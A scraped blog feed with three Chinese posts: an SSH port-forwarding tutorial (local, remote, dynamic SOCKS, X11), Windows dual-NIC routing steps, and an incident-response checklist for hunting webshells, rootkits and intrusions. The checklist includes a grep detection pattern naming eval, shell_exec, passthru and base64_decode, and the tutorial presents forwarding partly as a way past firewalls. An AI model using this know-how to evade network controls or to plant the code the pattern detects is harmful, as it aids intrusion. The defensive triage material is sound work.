<h5 id="图-3-远程端口转发"><a href="#图-3-远程端口转发" class="headerlink" title="图 3. 远程端口转发"></a>图 3. 远程端口转发</h5><p><img src="/images/2017-12-07/image003.jpg" alt=""></p>
<p>和本地端口转发相比，这次的图里，SSH Server 和 SSH Client 的位置对调了一下，但是数据流依然是一样的。我们在 LdapClientHost 上的应用将数据发送到本机的 7001 端口上，而本机的 SSH Server 会将 7001 端口收到的数据加密并转发到 LdapServertHost 的 SSH Client 上。 SSH Client 会解密收到的数据并将之转发到监听的 LDAP 389 端口上，最后再将从 LDAP 返回的数据原路返回以完成整个流程。</p>
<p>看到这里，你是不是会有点糊涂了么？为什么叫本地转发，而有时又叫远程转发？这两者有什么区别？</p>
<h3 id="本地转发与远程转发的对比与分析"><a href="#本地转发与远程转发的对比与分析" class="headerlink" title="本地转发与远程转发的对比与分析"></a>本地转发与远程转发的对比与分析</h3><p>不错，SSH Server，SSH Client，LdapServertHost，LdapClientHost，本地转发，远程转发，这么多的名词的确容易让人糊涂。让我们来分析一下其中的结构吧。首先，SSH 端口转发自然需要 SSH 连接，而 SSH 连接是有方向的，从 SSH Client 到 SSH Server 。而我们的应用也是有方向的，比如需要连接 LDAP Server 时，LDAP Server 自然就是 Server 端，我们应用连接的方向也是从应用的 Client 端连接到应用的 Server 端。如果这两个连接的方向一致，那我们就说它是本地转发。而如果两个方向不一致，我们就说它是远程转发。</p>
<p>我们可以回忆上面的两个例子来做个对照。</p>
<p>本地转发时：</p>
<p>LdapClientHost 同时是应用的客户端，也是 SSH Client，这两个连接都从它指向 LdapServertHost（既是 LDAP 服务端，也是 SSH Server）。</p>
<p>远程转发时：</p>
<p>LdapClientHost 是应用的客户端，但却是 SSH Server ；而 LdapServertHost 是 LDAP 的服务端，但却是 SSH Client 。这样两个连接的方向刚好相反。</p>
<p>另一个方便记忆的方法是，Server 端的端口都是预定义的固定端口（SSH Server 的端口 22，LDAP 的端口 389），而 Client 端的端口都是动态可供我们选择的端口（如上述例子中选用的 7001 端口）。如果 Server 端的两个端口都在同一台机器，Client 端的两个端口都在另一台机器上，那么这就是本地连接；如果这四个端口交叉分布在两个机器上，每台机器各有一个 Server 端端口，一个 Client 端端口，那就是远程连接。</p>
<p>弄清楚了两者的区别之后，再来看看两者的相同之处。如果你所在的环境下，既允许 LdapClientHost 发起 SSH 连接到 LdapServerHost，也允许 LdapServerHost 发起 SSH 连接到 LdapClientHost 。那么这时我们选择本地转发或远程转发都是可以的，能完成一样的功能。</p>
<p>接着让我们来看个进阶版的端口转发。我们之前涉及到的各种连接 / 转发都只涉及到了两台机器，还记得我们在本地转发中提到的一个问题么？本地转发命令中的 \<remote host\=""> 和 \<ssh hostname\=""> 可以是不同的机器么？</ssh></remote></p>
<p><code>ssh -L &lt;local port&gt;:&lt;remote host&gt;:&lt;remote port&gt; &lt;SSH hostname&gt;</code></p>
<p>答案是可以的！让我们来看一个涉及到四台机器 (A,B,C,D) 的例子。</p>
<h5 id="图-4-多主机转发应用"><a href="#图-4-多主机转发应用" class="headerlink" title="图 4. 多主机转发应用"></a>图 4. 多主机转发应用</h5><p><img src="/images/2017-12-07/image004.jpg" alt=""></p>
<p>在 SSH Client(C) 执行下列命令来建立 SSH 连接以及端口转发：</p>
<p><code>$ ssh -g -L 7001:&lt;B&gt;:389 &lt;D&gt;</code></p>
<p>然后在我们的应用客户端（A）上配置连接机器（C ）的 7001 端口即可。注意我们在命令中指定了“ -g ”参数以保证机器（A）能够使用机器（C）建立的本地端口转发。而另一个值得注意的地方是，在上述连接中，（A）<-> (C) 以及 (B)<->(D) 之间的连接并不是安全连接，它们之间没有经过 SSH 的加密及解密。如果他们之间的网络并不是值得信赖的网络连接，我们就需要谨慎使用这种连接方式了。</-></-></p>
<h2 id="第三部分-其他类型的转发"><a href="#第三部分-其他类型的转发" class="headerlink" title="第三部分 其他类型的转发"></a>第三部分 其他类型的转发</h2><h3 id="动态转发实例分析"><a href="#动态转发实例分析" class="headerlink" title="动态转发实例分析"></a>动态转发实例分析</h3><p>恩，动态转发，听上去很酷。当你看到这里时，有没有想过我们已经讨论过了本地转发，远程转发，但是前提都是要求有一个固定的应用服务端的端口号，例如前面例子中的 LDAP 服务端的 389 端口。那如果没有这个端口号怎么办？等等，什么样的应用会没有这个端口号呢？嗯，比如说用浏览器进行 Web 浏览，比如说 MSN 等等。</p>
<p>当我们在一个不安全的 WiFi 环境下上网，用 SSH 动态转发来保护我们的网页浏览及 MSN 信息无疑是十分必要的。让我们先来看一下动态转发的命令格式：</p>
<p><code>$ ssh -D &lt;local port&gt; &lt;SSH Server&gt;</code></p>
<p>例如：</p>
<p><code>$ ssh -D 7001 &lt;SSH Server&gt;</code></p>
<h5 id="图-5-动态端口转发"><a href="#图-5-动态端口转发" class="headerlink" title="图 5. 动态端口转发"></a>图 5. 动态端口转发</h5><p><img src="/images/2017-12-07/image005.jpg" alt=""></p>
<p>似乎很简单，我们依然选择了 7001 作为本地的端口号，其实在这里 SSH 是创建了一个 SOCKS 代理服务。来看看帮助文档中对 -D 参数的描述：</p>
<p><code>-D port `</code> <code>This works by allocating a socket to listen to port on the local</code> <code>side, and whenever a connection is made to this port, the con-</code> <code>nection is forwarded over the secure channel, and the applica-</code> <code>tion protocol is then used to determine where to connect to from</code> <code>the remote machine.  Currently the SOCKS4 and SOCKS5 protocols</code> <code>are supported, and ssh will act as a SOCKS server.  Only root</code> <code>can forward privileged ports.  Dynamic port forwardings can also</code> <code></code>be specified in the configuration file.`</p>
<p>之后的使用就简单了，我们可以直接使用 localhost:7001 来作为正常的 SOCKS 代理来使用，直接在浏览器或 MSN 上设置即可。在 SSH Client 端无法访问的网站现在也都可以正常浏览。而这里需要值得注意的是，此时 SSH 所包护的范围只包括从浏览器端（SSH Client 端）到 SSH Server 端的连接，并不包含从 SSH Server 端 到目标网站的连接。如果后半截连接的安全不能得到充分的保证的话，这种方式仍不是合适的解决方案。</p>
<h3 id="X-协议转发实例分析"><a href="#X-协议转发实例分析" class="headerlink" title="X 协议转发实例分析"></a>X 协议转发实例分析</h3><p>好了，让我们来看最后一个例子 - X 协议转发。</p>
<p>我们日常工作当中，可能会经常会远程登录到 Linux/Unix/Solaris/HP 等机器上去做一些开发或者维护，也经常需要以 GUI 方式运行一些程序，比如要求图形化界面来安装 DB2/WebSphere 等等。这时候通常有两种选择来实现：VNC 或者 X 窗口，让我们来看看后者。</p>
<p>使用 X 窗口通常需要分别安装：X Client 和 X Server 。在本例中我们的 X Client 就是所访问的远程 Linux/Unix/Solaris/HP，而我们的 X Server 则是发起访问的本地机器（例如你面前正在使用的笔记本或台式机）。把 X Client 端的 X 窗口显示在 X Server 端需要先行在 X Client 端指定 X Server 的位置，命令格式如下：</p>
<p><code>export DISPLAY=&lt;X Server IP&gt;:&lt;display #&gt;.&lt;virtual #&gt;</code></p>
<p>例如：</p>
<p><code>export DISPLAY=myDesktop:1.0</code></p>
<p>然后直接运行 X 应用即可，X 窗口就会自动在我们的本地端打开。</p>
<p>一切运行正常，但是，这时候 IT 部门突然在远程 Linux/Unix/Solaris/HP 前面加了一道防火墙。非常不幸的是，X 协议并不在允许通过的列表之内。怎么办？只能使用 VNC 了么？不，其实只要使用了 SSH 端口转发即可通过，同时也对 X 通讯数据做了加密，真是一举两得。（当然，使用此方法前最好先咨询相关 IT 部门是否符合相应的安全条例，以免造成违规操作。）</p>
<p>建立命令也很简单，直接从本地机器（X Server 端）发起一个如下的 SSH 连接即可：</p>
<p><code>$ ssh -X &lt;SSH Server&gt;</code></p>
<h5 id="图-6-X-转发"><a href="#图-6-X-转发" class="headerlink" title="图 6. X 转发"></a>图 6. X 转发</h5><p><img src="/images/2017-12-07/image006.jpg" alt=""></p>
<p>建立连接之后就可以直接运行远程的 X 应用。注意建立 X 转发之后会自动设置 DISPLAY 环境变量，通常会被设置成<code>localhost:10.0</code>，我们无需也不应该在连接之后再进行修改此环境变量。</p>
<p>一个比较常见的场景是，我们的本地机器是 Windows 操作系统，这时可以选择开源的 XMing 来作为我们的 XServer，而 SSH Client 则可以任意选择了，例如 PuTTY，Cygwin 均可以配置 访问 SSH 的同时建立 X 转发。</p>
<h2 id="第四部分-总结"><a href="#第四部分-总结" class="headerlink" title="第四部分 总结"></a>第四部分 总结</h2><p>至此，我们已经完成了本地端口转发，远程端口转发，动态端口转发以及 X 转发的介绍。回顾起来，总的思路是通过将 TCP 连接转发到 SSH 通道上以解决数据加密以及突破防火墙的种种限制。对一些已知端口号的应用，例如 Telnet/LDAP/SMTP，我们可以使用本地端口转发或者远程端口转发来达到目的。动态端口转发则可以实现 SOCKS 代理从而加密以及突破防火墙对 Web 浏览的限制。对于 X 应用，无疑是 X 转发最为适用了。虽然每一部分我们都只是简单的介绍了一下，但如果能灵活应用这些技巧，相信对我们的日常生活 / 工作也是会有所帮助的。</p>
]]></content>
      
        <categories>
            
            <category> web </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 端口转发 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[windows使用双网卡]]></title>
      <url>/2017/12/06/windows%E4%BD%BF%E7%94%A8%E5%8F%8C%E7%BD%91%E5%8D%A1/</url>
      <content type="html"><![CDATA[<p><strong>外网地址设置</strong></p>
<p>本地IP地址：192.168.1.1<br>子网掩码： 255.255.255.0，<br>网关： 192.168.1.1</p>
<p><strong>内网地址设置：</strong></p>
<p>本地IP地址：  192.168.42.129<br>子网掩码：255.255.255.0<br>网关：192.168.42.132</p>
<p>按正常的设置每块网卡的ip（或通过DHCP自动获取），再cmd下使用route print查看时会看到。即指向0.0.0.0的有两个网关，这样就会出现路由冲突，两个网络的访问都会出现问题。我们需要手动配置路由，才能实现同时访问两个网络。运行cmd（win7/8需要管理员权限）。</p>
<p><strong>第一步：</strong> route delete 0.0.0.0   ::删除所有的0.0.0.0的路由</p>
<p><strong>第二步：</strong>route -p add 0.0.0.0 mask 0.0.0.0 mask 192.168.1.1  ::添加0.0.0.0网络路由，这个是缺省时路由用192.168.1.1,加上-p的目的是设为静态（永久）路由，防止下次重起时配置消失。</p>
<p><strong>第三步：</strong> route -p add 192.168.42.0 mask 255.255.255.0 192.168.42.132  ::添加192.168.42.0网段路由为192.168.42.132内网路由，可以根据需要调整ip段和子网掩码太到多网段内网路由的效果。</p>
]]></content>
      
        <categories>
            
            <category> tool </category>
            
        </categories>
        
        
        <tags>
            
            <tag> windows </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[安全应急排查手册]]></title>
      <url>/2017/12/05/%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E6%8E%92%E6%9F%A5%E6%89%8B%E5%86%8C/</url>
      <content type="html"><![CDATA[<h2 id="1-事件分类"><a href="#1-事件分类" class="headerlink" title="1 事件分类"></a>1 事件分类</h2><p>常见的安全事件：</p>
<p>Web入侵：挂马、篡改、Webshell</p>
<p>系统入侵：系统异常、RDP爆破、SSH爆破、主机漏洞</p>
<p>病毒木马：远控、后门、勒索软件</p>
<p>信息泄漏：拖裤、数据库登录（弱口令）</p>
<p>网络流量：频繁发包、批量请求、DDOS攻击</p>
<h2 id="2-排查思路"><a href="#2-排查思路" class="headerlink" title="2 排查思路"></a>2 排查思路</h2><p>一个常规的入侵事件后的系统排查思路：</p>
<p><img src="/images/2017-12-05/59376b994b3f9.jfif" alt=""></p>
<h3 id="文件分析"><a href="#文件分析" class="headerlink" title="文件分析"></a>文件分析</h3><blockquote>
<p>a) 文件日期、新增文件、可疑/异常文件、最近使用文件、浏览器下载文件</p>
<p>b) Webshell 排查与分析</p>
<p>c) 核心应用关联目录文件分析</p>
</blockquote>
<h3 id="进程分析"><a href="#进程分析" class="headerlink" title="进程分析"></a>进程分析</h3><blockquote>
<p>a) 当前活动进程 &amp; 远程连接</p>
<p>b) 启动进程&amp;计划任务</p>
<p>c) 进程工具分析</p>
<p>​      i. Windows:Pchunter</p>
<p>​      ii. Linux: Chkrootkit&amp;Rkhunter</p>
</blockquote>
<h3 id="系统信息"><a href="#系统信息" class="headerlink" title="系统信息"></a>系统信息</h3><blockquote>
<p>a) 环境变量</p>
<p>b) 帐号信息</p>
<p>c) History</p>
<p>d) 系统配置文件</p>
</blockquote>
<h3 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h3><blockquote>
<p>a) 操作系统日志</p>
<p>​      i. Windows: 事件查看器（eventvwr）</p>
<p>​      ii. Linux: /var/log/</p>
<p>b) 应用日志分析</p>
<p>​      i. Access.log</p>
<p>​      ii. Error.log</p>
</blockquote>
<h3 id="3-分析排查"><a href="#3-分析排查" class="headerlink" title="3 分析排查"></a>3 分析排查</h3><h4 id="3-1-Linux系列分析排查"><a href="#3-1-Linux系列分析排查" class="headerlink" title="3.1 Linux系列分析排查"></a>3.1 Linux系列分析排查</h4><h5 id="3-1-1-文件分析"><a href="#3-1-1-文件分析" class="headerlink" title="3.1.1 文件分析"></a>3.1.1 文件分析</h5><p>敏感目录的文件分析（类/tmp目录，命令目录/usr/bin /usr/sbin）</p>
<p>  例如:</p>
<p>  查看tmp目录下的文件： ls –alt /tmp/</p>
<p>  查看开机启动项内容：ls -alt /etc/init.d/</p>
<p>  查看指定目录下文件时间的排序：ls  -alt  | head -n 10</p>
<p>  针对可疑文件可以使用stat进行创建修改时间、访问时间的详细查看，若修改时间距离事件日期接近，有   线性关联，说明可能被篡改或者其他。</p>
<p><img src="/images/2017-12-05/59376b9c7bbd0.jfif" alt=""></p>
<p>新增文件分析</p>
<p>  例如要查找24小时内被修改的JSP文件： find ./ -mtime 0 -name &quot;*.jsp&quot;</p>
<p>  （最后一次修改发生在距离当前时间n24小时至(n+1)24 小时）</p>
<p>  查找72小时内新增的文件find / -ctime -2</p>
<p>  PS：-ctime 内容未改变权限改变时候也可以查出</p>
<p> 根据确定时间去反推变更的文件</p>
<p>  ls -al /tmp | grep &quot;Feb 27&quot;</p>
<p>特殊权限的文件</p>
<p>  查找777的权限的文件   find  /  *.jsp  -perm 4777  </p>
<p>隐藏的文件（以 &quot;.&quot;开头的具有隐藏属性的文件）</p>
<p>在文件分析过程中，手工排查频率较高的命令是 find grep ls 核心目的是为了关联推理出可疑文件。</p>
<h5 id="3-1-2-进程命令"><a href="#3-1-2-进程命令" class="headerlink" title="3.1.2 进程命令"></a>3.1.2 进程命令</h5><p>使用netstat 网络连接命令，分析可疑端口、可疑IP、可疑PID及程序进程</p>
<p>   netstat –antlp | more</p>
<p><img src="/images/2017-12-05/59376ba136b5f.jfif" alt=""></p>
<p>使用ps命令，分析进程</p>
<p>ps aux | grep pid | grep –v grep </p>
<p><img src="/images/2017-12-05/59376ba5c8763.jfif" alt=""></p>
<p>将netstat与ps 结合，可参考vinc牛的案例：</p>
<p><img src="/images/2017-12-05/59376ba9a532c.jfif" alt=""></p>
<p>（可以使用lsof -i:1677 查看指定端口对应的程序）</p>
<p>使用ls 以及 stat 查看系统命令是否被替换。</p>
<p>两种思路：第一种查看命令目录最近的时间排序，第二种根据确定时间去匹配。</p>
<p>  ls -alt /usr/bin   | head -10</p>
<p>  ls -al /bin /usr/bin /usr/sbin/ /sbin/ | grep &quot;Jan 15&quot;</p>
<p><img src="/images/2017-12-05/59376f9f9746d.jfif" alt=""></p>
<p>PS：如果日期数字&lt;10，中间需要两个空格。比如1月1日，grep “Jan  1”</p>
<p>隐藏进程查看</p>
<p>ps -ef | awk &#39;{print}&#39; | sort -n | uniq &gt;1<br>ls /proc | sort -n |uniq &gt;2<br>diff 1 2</p>
<h5 id="3-1-3-系统信息"><a href="#3-1-3-系统信息" class="headerlink" title="3.1.3 系统信息"></a>3.1.3 系统信息</h5><p>history (cat /root/.bash_history)<br>/etc/passwd<br>crontab  /etc/cron*<br>rc.local  /etc/init.d chkconfig<br>last<br>$PATH<br>strings</p>
<p>查看分析history (cat /root/.bash_history)，曾经的命令操作痕迹，以便进一步排查溯源。运气好有可能通过记录关联到如下信息：</p>
<p>   a) wget 远程某主机（域名&amp;IP）的远控文件；</p>
<p>   b) 尝试连接内网某主机（ssh scp），便于分析攻击者意图;</p>
<p>   c) 打包某敏感数据或代码，tar zip 类命令</p>
<p>   d) 对系统进行配置，包括命令修改、远控木马类，可找到攻击者关联信息…</p>
<p>查看分析用户相关分析</p>
<p>  a) useradd userdel 的命令时间变化（stat），以及是否包含可疑信息</p>
<p>  b) cat /etc/passwd 分析可疑帐号，可登录帐号</p>
<p>  查看UID为0的帐号：awk -F: &#39;{if($3==0)print $1}&#39; /etc/passwd</p>
<p>  查看能够登录的帐号：cat /etc/passwd  | grep -E &quot;/bin/bash$&quot;</p>
<p>  PS：UID为0的帐号也不一定都是可疑帐号，Freebsd默认存在toor帐号，且uid为0.（toor 在BSD官网解释为root替代帐号，属于可信帐号）</p>
<p><img src="/images/2017-12-05/59376fa56d8e4.jfif" alt=""></p>
<p>查看分析任务计划</p>
<p>   a) 通过crontabl –l 查看当前的任务计划有哪些，是否有后门木马程序启动相关信息；</p>
<p>   b) 查看etc目录任务计划相关文件，ls /etc/cron*</p>
<p>查看linux 开机启动程序</p>
<p>   a) 查看rc.local文件（/etc/init.d/rc.local     /etc/rc.local）</p>
<p>   b) ls –alt /etc/init.d/</p>
<p>   c) chkconfig</p>
<p>查看系统用户登录信息</p>
<p>   a) 使用lastlog命令，系统中所有用户最近一次登录信息。</p>
<p>   b) 使用lastb命令，用于显示用户错误的登录列表</p>
<p>   c) 使用last命令，用于显示用户最近登录信息（数据源为/var/log/wtmp，var/log/btmp）</p>
<p>​       utmp文件中保存的是当前正在本系统中的用户的信息。</p>
<p>​       wtmp文件中保存的是登录过本系统的用户的信息。</p>
<p>​       /var/log/wtmp 文件结构和/var/run/utmp 文件结构一样，都是引用/usr/include/bits/utmp.h 中的struct utmp</p>
<p><img src="/images/2017-12-05/59376faa2f97f.jfif" alt="干货 | 黑客入侵？这里有详细的应急排查手册！"></p>
<p>系统路径分析</p>
<p>   a) echo $PATH 分析有无敏感可疑信息</p>
<p>指定信息检索</p>
<p>   a) strings命令在对象文件或二进制文件中查找可打印的字符串</p>
<p>   b) 分析sshd 文件，是否包括IP信息strings /usr/bin/.sshd | egrep &#39;[1-9]{1,3}.[1-9]{1,3}.&#39;</p>
<p>   PS：此正则不严谨，但匹配IP已够用</p>
<p>   c) 根据关键字匹配命令内是否包含信息（如IP地址、时间信息、远控信息、木马特征、代号名称）</p>
<p>查看ssh相关目录有无可疑的公钥存在。</p>
<p>   a) Redis（6379） 未授权恶意入侵，即可直接通过redis到目标主机导入公钥。</p>
<p>   b) 目录： /etc/ssh    ./.ssh/</p>
<h5 id="3-1-4-后门排查"><a href="#3-1-4-后门排查" class="headerlink" title="3.1.4 后门排查"></a>3.1.4 后门排查</h5><p>除以上文件、进程、系统 分析外，推荐工具：</p>
<p>​    chkrootkit  rkhunter（<a href="http://www.chkrootkit.org" target="_blank" rel="external">www.chkrootkit.org</a>   rkhunter.sourceforge.net）</p>
<p>Ø chkrootkit</p>
<blockquote>
<p>(迭代更新了20年)主要功能：</p>
<p>检测是否被植入后门、木马、rootkit</p>
<p>检测系统命令是否正常</p>
<p>检测登录日志</p>
<p>详细参考README</p>
</blockquote>
<p><img src="/images/2017-12-05/59376fb0379ff.jfif" alt=""></p>
<p>Ø rkhunter主要功能：</p>
<blockquote>
<p>系统命令（Binary）检测，包括Md5 校验</p>
<p>Rootkit检测</p>
<p>本机敏感目录、系统配置、服务及套间异常检测</p>
<p>三方应用版本检测</p>
</blockquote>
<p><img src="/images/2017-12-05/59376fbbc7f15.jfif" alt=""></p>
<p>Ø RPM check检查</p>
<p>系统完整性也可以通过rpm自带的-Va来校验检查所有的rpm软件包,有哪些被篡改了,防止rpm也被替换,上传一个安全干净稳定版本rpm二进制到服务器上进行检查</p>
<p>./rpm -Va &gt; rpm.log</p>
<p>如果一切均校验正常将不会产生任何输出。如果有不一致的地方，就会显示出来。输出格式是8位长字符串,  c 用以指配置文件, 接着是文件名. 8位字符的每一个 用以表示文件与RPM数据库中一种属性的比较结果 。 . (点) 表示测试通过。.下面的字符表示对RPM软件包进行的某种测试失败：</p>
<p>5 MD5 校验码<br>S 文件尺寸<br>L 符号连接<br>T 文件修改日期<br>D 设备<br>U 用户<br>G 用户组<br>M 模式e (包括权限和文件类型)</p>
<p>借用sobug文章案例：如下图可知ps, pstree, netstat, sshd等等系统关键进程被篡改了</p>
<p><img src="/images/2017-12-05/59377238ecb67.jfif" alt=""></p>
<p>Ø Webshell查找</p>
<p>​    Webshell的排查可以通过文件、流量、日志三种方式进行分析，基于文件的命名特征和内容特征，相对操作性较高，在入侵后应急过程中频率也比较高。</p>
<p>可根据webshell特征进行命令查找，简单的可使用(当然会存在漏报和误报)</p>
<p>find /var/www/ -name &quot;<em>.php&quot; |xargs egrep &#39;assert|phpspy|c99sh|milw0rm|eval|(gunerpress|(base64_decoolcode|spider_bc|shell_exec|passthru|(\$\_\POST[|eval (str_rot13|.chr(|\${\&quot;\_P|eval(\$\_R|file_put_contents(.\</em>\$\_|base64_decode&#39;</p>
<p>Webshell的排查可以通过</p>
<p>Github上存在各种版本的webshell查杀脚本，当然都有自己的特点，可使用河马shell查杀（shellpub.com）</p>
<p>综上所述，通过chkrootkit 、rkhunter、RPM check、Webshell Check 等手段得出以下应对措施：</p>
<p>根据进程、连接等信息关联的程序，查看木马活动信息。</p>
<p>假如系统的命令（例如netstat ls 等）被替换，为了进一步排查，需要下载一新的或者从其他未感染的主机拷贝新的命令。</p>
<p>发现可疑可执行的木马文件，不要急于删除，先打包备份一份。</p>
<p>发现可疑的文本木马文件，使用文本工具对其内容进行分析，包括回连IP地址、加密方式、关键字（以便扩大整个目录的文件特征提取）等。</p>
<p>3.1.5 日志分析</p>
<p>​    日志文件 /var/log/message       包括整体系统信息 /var/log/auth.log        包含系统授权信息，包括用户登录和使用的权限机制等 /var/log/userlog         记录所有等级用户信息的日志。 /var/log/cron           记录crontab命令是否被正确的执行 /var/log/xferlog(vsftpd.log)记录Linux FTP日志 /var/log/lastlog         记录登录的用户，可以使用命令lastlog查看 /var/log/secure         记录大多数应用输入的账号与密码，登录成功与否 var/log/wtmp　　      记录登录系统成功的账户信息，等同于命令last var/log/faillog　　      记录登录系统不成功的账号信息，一般会被黑客删除   </p>
<p>1.日志查看分析，grep,sed,sort,awk综合运用</p>
<p>2.基于时间的日志管理：</p>
<p>   /var/log/wtmp</p>
<p>   /var/run/utmp</p>
<p>   /var/log/lastlog(lastlog)</p>
<p>   /var/log/btmp(lastb)</p>
<p>3.登录日志可以关注Accepted、Failed password 、invalid特殊关键字</p>
<p>4.登录相关命令</p>
<p>​     lastlog 记录最近几次成功登录的事件和最后一次不成功的登录    who 命令查询utmp文件并报告当前登录的每个用户。Who的缺省输出包括用户名、终端类型、登录日期及远程主机    w 命令查询utmp文件并显示当前系统中每个用户和它所运行的进程信息    users 用单独的一行打印出当前登录的用户，每个显示的用户名对应一个登录会话。如果一个用户有不止一个登录会话，那他的用户名把显示相同的次数    last 命令往回搜索wtmp来显示自从文件第一次创建以来登录过的用户    finger 命令用来查找并显示用户信息，系统管理员通过使用该命令可以知道某个时候到底有多少用户在使用这台Linux主机。   </p>
<p>5.几个语句<br>​       定位有多少IP在爆破主机的root帐号    grep &quot;Failed password for root&quot; /var/log/auth.log | awk &#39;{print $11}&#39; | sort | uniq -c | sort -nr | more    登录成功的IP有哪些    grep &quot;Accepted &quot; /var/log/auth.log | awk &#39;{print $11}&#39; | sort | uniq -c | sort -nr | more      tail -400f demo.log #监控最后400行日志文件的变化 等价与 tail -n 400 -f （-f参数是实时）      less demo.log #查看日志文件，支持上下滚屏，查找功能      uniq -c demo.log  #标记该行重复的数量，不重复值为1    grep -c &#39;ERROR&#39; demo.log   #输出文件demo.log中查找所有包行ERROR的行的数量   </p>
<p>3.1.6 相关处置</p>
<p>kill -9</p>
<p>chattr –i</p>
<p>rm </p>
<p>setfacl</p>
<p>ssh </p>
<p>chmod</p>
<p>3.2 Windows系列分析排查</p>
<p>3.2.1 文件分析</p>
<p>1.开机启动有无异常文件</p>
<p>2.各个盘下的temp(tmp)相关目录下查看有无异常文件</p>
<p>3.浏览器浏览痕迹、浏览器下载文件、浏览器cookie信息</p>
<p>4.查看文件时间，创建时间、修改时间、访问时间。对应linux的ctime mtime atime，通过对文件右键属性即可看到详细的时间（也可以通过dir /tc 1.aspx 来查看创建时间），黑客通过菜刀类工具改变的是修改时间。所以如果修改时间在创建时间之前明显是可疑文件。</p>
<p>5.查看用户recent相关文件，通过分析最近打开分析可疑文件</p>
<p>   a) C:\Documents and Settings\Administrator\Recent</p>
<p>   b) C:\Documents and Settings\Default User\Recent</p>
<p>   c) 开始,运行   %UserProfile%\Recent</p>
<p>6.根据文件夹内文件列表时间进行排序，查找可疑文件。当然也可以搜索指定日期范围的文件及文件件</p>
<p>Server 2008 R2系列</p>
<p><img src="/images/2017-12-05/593bbbe0e794b.jfif" alt=""></p>
<p>Win10 系列</p>
<p><img src="/images/2017-12-05/593bbbe2645b0.jfif" alt=""></p>
<p>7.关键字匹配，通过确定后的入侵时间，以及webshell或js文件的关键字（比如博彩类），可以在IIS 日志中进行过滤匹配，比如经常使用:</p>
<p>8.</p>
<p>知道是上传目录，在web log 中查看指定时间范围包括上传文件夹的访问请求<br>   findstr /s /m /I “UploadFiles” <em>.log<br>   某次博彩事件中的六合彩信息是six.js<br>   findstr /s /m /I “six.js” </em>.aspx<br>   根据shell名关键字去搜索D盘spy相关的文件有哪些<br>   for /r d:\ %i in (<em>spy</em>.aspx) do @echo %i<br>   <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">##### 3.2.2 进程命令</div><div class="line"></div><div class="line">1.netstat -ano 查看目前的网络连接，定位可疑的ESTABLISHED</div><div class="line"></div><div class="line">2.根据netstat 定位出的pid，再通过tasklist命令进行进程定位</div><div class="line"></div><div class="line">![](/images/2017-12-05/593bbbe4131e9.jfif)</div><div class="line"></div><div class="line">3.通过tasklist命令查看可疑程序</div><div class="line"></div><div class="line">##### 3.2.3 系统信息</div><div class="line"></div><div class="line">1.使用set命令查看变量的设置</div><div class="line"></div><div class="line">2.Windows 的计划任务；</div><div class="line"></div><div class="line">3.Windows 的帐号信息，如隐藏帐号等</div><div class="line"></div><div class="line">4.配套的注册表信息检索查看，SAM文件以及远控软件类</div><div class="line"></div><div class="line">5.查看systeminfo 信息，系统版本以及补丁信息</div><div class="line"></div><div class="line">   例如系统的远程命令执行漏洞MS08-067、MS09-001、MS17-010（永恒之蓝）…</div><div class="line"></div><div class="line">   若进行漏洞比对，建议使用Windows-Exploit-Suggester </div><div class="line"></div><div class="line">   https://github.com/GDSSecurity/Windows-Exploit-Suggester/</div><div class="line"></div><div class="line">3.2.4 后门排查</div><div class="line"></div><div class="line">PC Hunter是一个Windows系统信息查看软件</div><div class="line"></div><div class="line">http://www.xuetr.com/</div><div class="line"></div><div class="line">功能列表如下：</div><div class="line"></div><div class="line">1.进程、线程、进程模块、进程窗口、进程内存信息查看，杀进程、杀线程、卸载模块等功能</div><div class="line">2.内核驱动模块查看，支持内核驱动模块的内存拷贝</div><div class="line">3.SSDT、Shadow SSDT、FSD、KBD、TCPIP、Classpnp、Atapi、Acpi、SCSI、IDT、GDT信息查看，并能检测和恢复ssdt hook和inline hook</div><div class="line">4.CreateProcess、CreateThread、LoadImage、CmpCallback、BugCheckCallback、Shutdown、Lego等Notify Routine信息查看，并支持对这些Notify Routine的删除</div><div class="line">5.端口信息查看，目前不支持2000系统</div><div class="line">6.查看消息钩子</div><div class="line">7.内核模块的iat、eat、inline hook、patches检测和恢复</div><div class="line">8.磁盘、卷、键盘、网络层等过滤驱动检测，并支持删除</div><div class="line">9.注册表编辑</div><div class="line">10.进程iat、eat、inline hook、patches检测和恢复</div><div class="line">11.文件系统查看，支持基本的文件操作</div><div class="line">12.查看（编辑）IE插件、SPI、启动项、服务、Host文件、映像劫持、文件关联、系统防火墙规则、IME</div><div class="line">13.ObjectType Hook检测和恢复</div><div class="line">14.DPC定时器检测和删除</div><div class="line">15.MBR Rootkit检测和修复</div><div class="line">16.内核对象劫持检测</div><div 